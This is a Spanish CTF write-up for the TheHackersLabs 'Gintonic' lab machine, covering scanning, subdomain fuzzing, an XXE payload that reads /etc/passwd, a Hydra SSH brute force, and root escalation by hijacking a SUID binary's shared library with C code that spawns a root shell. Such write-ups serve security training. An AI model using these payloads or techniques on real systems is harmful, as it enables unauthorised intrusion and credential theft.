---
title: Gintonic - THL
date: 2026-10-03
mermaid: true
categories: [TheHackersLabs, "Linux  "]
image: 
  path: /assets/images/thl/gintonic/logo.png
tags: [Linux, Medium, XXE]
---

# Enumeration
Vamos a realizar un escaneo de la red para encontrar la máquina:
```bash
┌──(kali㉿kali)-[~/Desktop/thl/Gintonic]
└─$ sudo arp-scan -I eth0 --local
Interface: eth0, type: EN10MB, MAC: 08:00:27:5a:87:bc, IPv4: 10.0.2.15
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:55:0a:00:02:01       (Unknown: locally administered)
10.0.2.2        08:00:27:be:cb:d3       PCS Systemtechnik GmbH
10.0.2.3        52:55:0a:00:02:03       (Unknown: locally administered)
10.0.2.5        08:00:27:43:5b:e5       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.995 seconds (128.32 hosts/sec). 4 responded
```
Vamos a realizar un escaneo nmap a la `10.0.2.5` para ver que puertos abiertos tiene:
```bash
┌──(kali㉿kali)-[~/Desktop/thl/Gintonic]
└─$ nmap -p- --open -sS -n -Pn -vvv 10.0.2.5
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 09:19 -0400
Initiating ARP Ping Scan at 09:19
Scanning 10.0.2.5 [1 port]
Completed ARP Ping Scan at 09:19, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:19
Scanning 10.0.2.5 [65535 ports]
Discovered open port 22/tcp on 10.0.2.5
Discovered open port 80/tcp on 10.0.2.5
Completed SYN Stealth Scan at 09:19, 1.57s elapsed (65535 total ports)
Nmap scan report for 10.0.2.5
Host is up, received arp-response (0.000089s latency).
Scanned at 2026-10-03 09:19:45 EDT for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:43:5B:E5 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```
Vamos a realizar un segundo escaneo nmap para ver más información de los servicios:
```bash
┌──(kali㉿kali)-[~/Desktop/thl/Gintonic]
└─$ nmap -p22,80 -sCV 10.0.2.5              
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-03 09:20 -0400
Nmap scan report for 10.0.2.5
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 d2:a6:e1:05:83:1a:9d:19:8a:7d:a7:dd:f2:9d:62:ef (ECDSA)
|_  256 45:05:04:d7:24:1c:94:a6:6b:63:43:1d:cd:a9:8f:de (ED25519)
80/tcp open  http    Apache httpd 2.4.61
|_http-title: Did not follow redirect to http://gintonic.thl/
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: 08:00:27:43:5B:E5 (Oracle VirtualBox virtual NIC)
Service Info: Host: gintonic.thl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.02 seconds
```

Vemos que tiene un dominio configurado `gintonic.thl`, vamos añadirlo a nuestro `/etc/hosts`:
```
10.0.2.5 gintonic.thl
```

Vamos a ver que tecnologías tiene la aplicación web:
```bash
┌──(kali㉿kali)-[~/Desktop/thl/Gintonic]
└─$ whatweb http://gintonic.thl/
http://gintonic.thl/ [200 OK] Apache[2.4.61], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.61 (Debian)], IP[10.0.2.5], Script, Title[Hack the Machine]
```

Vamos acceder a la aplicación web:

![](/assets/images/thl/gintonic/1.png)

Vemos que no hay gran cosa, vamos a realizar fuzzing para ver si encontramos algún directorio o archivo interesante:
```bash
┌──(kali㉿kali)-[~/Desktop/thl/Gintonic]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -u "http://gintonic.thl/FUZZ" -e .php,.html,.js,.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://gintonic.thl/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 :: Extensions       : .php .html .js .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 2750, Words: 996, Lines: 87, Duration: 83ms]
.html                   [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 351ms]
index.html              [Status: 200, Size: 2750, Words: 996, Lines: 87, Duration: 355ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 357ms]
```
Vemos que no hay nada interesante. Vamosa  enumerar subdominios:
```bash
┌──(kali㉿kali)-[~/Desktop/thl/Gintonic]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ic -u "http://gintonic.thl" -H 'Host: FUZZ.gintonic.thl' -c -fw 20

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://gintonic.thl
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.gintonic.thl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 20
________________________________________________

register                [Status: 200, Size: 1696, Words: 616, Lines: 63, Duration: 2ms]
:: Progress: [19964/19964] :: Job [1/1] :: 66 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
Vamos añadir este subdominio al `/etc/hosts`:
```bash
10.0.2.5 gintonic.thl register.gintonic.thl
```

Vamos a acceder al subdominio:

![](/assets/images/thl/gintonic/2.png)

# Shell as fermin

## XML External Entity (XXE)

Vamos a poner cualquier dato a ver que ocurre:

![](/assets/images/thl/gintonic/3.png)

![](/assets/images/thl/gintonic/4.png)

Vemos que acepta XML, esto es interesante ya que si lo procesa podríamos intentar explotar un XML External Entities (XXE). Vamos a intentar cambiar el cuerpo de la solicitud por un XML:

![](/assets/images/thl/gintonic/5.png)

Vemos que no esta devolviendo el error de que no se a podido procesar la solicitud, eso puede ser porque no acepte de esta manera XML. Vamos a intentar insertar el XML en el formulario y que viaje por POST en `x-www-form-url-encoded`:

![](/assets/images/thl/gintonic/6.png)

![](/assets/images/thl/gintonic/7.png)

Vemos que lo a aceptado correctamente!! Podríamos probar un XXE para leer archivos locales de la máquina pero no vemos ningún lado para reflejarlo. En el formulario en el `placeholder`:

![](/assets/images/thl/gintonic/8.png)

Vemos varios posibles valores, vamos a probar con nombre indicarlo como valor `<name></name>` en el XML:

![](/assets/images/thl/gintonic/9.png)

Vemos que se refleja. Ahora vamos a crear una entidad externa que recoga el valor del archivo `/etc/passwd` y reflejarlo en `<name></name>`:

Payload:

```xml
<!DOCTYPE test [<!ENTITY data SYSTEM "file:///etc/passwd" >] >
<userInfo><name>&data;</name></userInfo>
```

![](/assets/images/thl/gintonic/10.png)

Bien!! Hemos podido leer el `/etc/passwd` mediante una entidad externa usando el protoclo URL `file://`. 

Vemos que existe el usaurio `fermin`, intentando leer archivos como `id_rsa` no logramos nada con exito. 

## Brute Force SSH

Vamos a intentar realizar un ataque de fuerza bruta al usuario `fermin`:

> Tarda un buen rato la fuerza bruta.
{: .prompt-warning }

```bash
┌──(kali㉿kali)-[~/Desktop/thl/Gintonic]
└─$ hydra -l 'fermin' -P /usr/share/wordlists/rockyou.txt ssh://gintonic.thl
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-03 09:41:59
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://gintonic.thl:22/
[STATUS] 243.00 tries/min, 243 tries in 00:01h, 14344159 to do in 983:50h, 13 active
[STATUS] 215.00 tries/min, 645 tries in 00:03h, 14343759 to do in 1111:56h, 11 active
[22][ssh] host: gintonic.thl   login: fermin   password: cutegirl
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-03 09:48:40
```

Vamos a acceder por SSH:

```bash
┌──(kali㉿kali)-[~/Desktop/thl/Gintonic]
└─$ ssh fermin@gintonic.thl 
fermin@gintonic.thl's password: 
Linux TheHackersLabs-Gintonic 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Aug 15 12:00:17 2024 from 192.168.1.41
fermin@TheHackersLabs-Gintonic:~$
```
# Shell as root
Vamos a enumerar que binarios en el sistema tienen el permiso SUID:
```bash
fermin@TheHackersLabs-Gintonic:~$ find / -perm -4000 -ls 2>/dev/null 
  1070312    640 -rwsr-xr-x   1 root     root       653888 jun 22  2024 /usr/lib/openssh/ssh-keysign
  1070275     52 -rwsr-xr--   1 root     messagebus    51272 sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  1047972     48 -rwsr-xr-x   1 root     root          48896 mar 23  2023 /usr/bin/newgrp
  1044601     52 -rwsr-xr-x   1 root     root          52880 mar 23  2023 /usr/bin/chsh
  1044600     64 -rwsr-xr-x   1 root     root          62672 mar 23  2023 /usr/bin/chfn
  1046473     60 -rwsr-xr-x   1 root     root          59704 mar 28  2024 /usr/bin/mount
  1046474     36 -rwsr-xr-x   1 root     root          35128 mar 28  2024 /usr/bin/umount
  1080490     16 -rwsr-xr-x   1 root     root          15992 ago 15  2024 /usr/bin/welcome
  1044604     68 -rwsr-xr-x   1 root     root          68248 mar 23  2023 /usr/bin/passwd
  1044603     88 -rwsr-xr-x   1 root     root          88496 mar 23  2023 /usr/bin/gpasswd
  1044581     72 -rwsr-xr-x   1 root     root          72000 mar 28  2024 /usr/bin/su
```

Vemos un binario no común que es `welcome`, vamos a ejecutarlo a ver que realiza:
```bash
fermin@TheHackersLabs-Gintonic:~$ /usr/bin/welcome
/usr/bin/welcome: error while loading shared libraries: libwelcome.so: cannot open shared object file: No such file or directory
```
Esto es interesante ya que si está buscando una libreria llamada `libwelcome.so` podríamos crear nosotros esa libreria y que ejecute cualquier comando como `root`.

Vamos a crear un archivo llamado `libwelcome.c`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void test(void){
        setgid(0);
        setuid(0);
        system("id");
}
```

Ahora vamos a compilarlo en un `.so` con `gcc`:
```bash
fermin@TheHackersLabs-Gintonic:~$ gcc -shared -o libwelcome.so -fPIC libwelcome.c
fermin@TheHackersLabs-Gintonic:~$ ls 
libwelcome.c  libwelcome.so  user.txt
```

Bien ahora meteremos esto en una carpeta llamada `lib` y lo ejecutaremos indicando `LD_LIBRARY_PATH` sea el home de  fermin:
```bash
fermin@TheHackersLabs-Gintonic:~$ mv libwelcome.so lib
fermin@TheHackersLabs-Gintonic:~$ LD_LIBRARY_PATH="$PWD" /usr/bin/welcome
Welcome! Este programa depende de libwelcome.so.
/usr/bin/welcome: symbol lookup error: /usr/bin/welcome: undefined symbol: welcome
```
Vemos que usa la libreria pero indica que no encuentra `welcome`, vamos a renombrar la función por `welcome`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void welcome(void){
        setgid(0);
        setuid(0);
        system("id");
}
```

Ahora lo compilamos y lo movemos a `lib`:
```bash
fermin@TheHackersLabs-Gintonic:~$ gcc -shared -o libwelcome.so -fPIC libwelcome.c
fermin@TheHackersLabs-Gintonic:~$ mv libwelcome.so lib
```

Ahora vamos a ejecutarlo:
```bash
fermin@TheHackersLabs-Gintonic:~$ LD_LIBRARY_PATH="$PWD" /usr/bin/welcome
Welcome! Este programa depende de libwelcome.so.
uid=0(root) gid=0(root) grupos=0(root),1001(fermin)
```

Hemos conseguido ejecutar `id` como `root`, ahora vamos a darnos una `/bin/bash`:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void welcome(void){
        setgid(0);
        setuid(0);
        system("/bin/bash");
}

```

Vamos a ejecutarlo:
```bash
fermin@TheHackersLabs-Gintonic:~$ LD_LIBRARY_PATH="$PWD" /usr/bin/welcome
Welcome! Este programa depende de libwelcome.so.
root@TheHackersLabs-Gintonic:~#
root@TheHackersLabs-Gintonic:~# whoami; hostname -I
root
10.0.2.5 
```

root! ;)

-- -
